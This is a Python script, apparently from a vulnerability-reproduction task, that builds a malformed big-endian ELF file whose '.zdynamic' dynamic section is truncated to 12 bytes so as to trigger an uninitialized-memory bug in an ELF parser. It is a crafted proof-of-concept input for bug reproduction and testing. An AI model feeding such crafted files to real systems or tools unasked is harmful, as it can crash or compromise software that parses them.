import struct

def be16(x): return struct.pack('>H', x)
def be32(x): return struct.pack('>I', x)
def be64(x): return struct.pack('>Q', x)

# ELF header (64 bytes)
ehdr = b''
ehdr += b'\x7fELF'
ehdr += bytes([2])          # EI_CLASS: ELFCLASS64
ehdr += bytes([2])          # EI_DATA: ELFDATA2MSB (big-endian)
ehdr += bytes([1])          # EI_VERSION
ehdr += bytes([0])          # EI_OSABI
ehdr += bytes([0])          # EI_ABIVERSION
ehdr += b'\x00' * 7         # EI_PAD
ehdr += be16(1)             # e_type: ET_REL
ehdr += be16(0x3e)          # e_machine: EM_X86_64
ehdr += be32(1)             # e_version
ehdr += be64(0)             # e_entry
ehdr += be64(0)             # e_phoff
ehdr += be64(0)             # e_shoff (placeholder)
ehdr += be32(0)             # e_flags
ehdr += be16(64)            # e_ehsize
ehdr += be16(0)             # e_phentsize
ehdr += be16(0)             # e_phnum
ehdr += be16(64)            # e_shentsize
ehdr += be16(3)             # e_shnum
ehdr += be16(2)             # e_shstrndx

# Section data: .zdynamic section with 12 bytes (partial Elf64_Dyn)
# Elf64_Dyn is 16 bytes, so 12 bytes means 0 full structures converted,
# leaving all 12 bytes uninitialized.
dyn_data = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c'  # 12 bytes

# Section header string table
shstrtab_data = b'\x00.zdynamic\x00.shstrtab\x00'

# Layout: ELF header (64) + dyn_data + shstrtab_data + section headers
dyn_offset = 64
shstrtab_offset = dyn_offset + len(dyn_data)
shoff = shstrtab_offset + len(shstrtab_data)

# Section 0: null
sh0 = b'\x00' * 64

# Section 1: .zdynamic (SHT_DYNAMIC = 6)
sh1 = b''
sh1 += be32(1)              # sh_name: ".zdynamic"
sh1 += be32(6)              # sh_type: SHT_DYNAMIC
sh1 += be64(0)              # sh_flags (no SHF_ALLOC, no SHF_COMPRESSED)
sh1 += be64(0)              # sh_addr
sh1 += be64(dyn_offset)     # sh_offset
sh1 += be64(len(dyn_data))  # sh_size = 12
sh1 += be32(0)              # sh_link
sh1 += be32(0)              # sh_info
sh1 += be64(8)              # sh_addralign
sh1 += be64(0)              # sh_entsize

# Section 2: .shstrtab
sh2 = b''
sh2 += be32(11)             # sh_name: ".shstrtab"
sh2 += be32(3)              # sh_type: SHT_STRTAB
sh2 += be64(0)              # sh_flags
sh2 += be64(0)              # sh_addr
sh2 += be64(shstrtab_offset)  # sh_offset
sh2 += be64(len(shstrtab_data))  # sh_size
sh2 += be32(0)              # sh_link
sh2 += be32(0)              # sh_info
sh2 += be64(1)              # sh_addralign
sh2 += be64(0)              # sh_entsize

# Update e_shoff
ehdr = ehdr[:40] + be64(shoff) + ehdr[48:]

poc = ehdr + dyn_data + shstrtab_data + sh0 + sh1 + sh2
with open('/workspace/poc.elf', 'wb') as f:
    f.write(poc)
print("Written", len(poc), "bytes to /workspace/poc.elf")
EOF
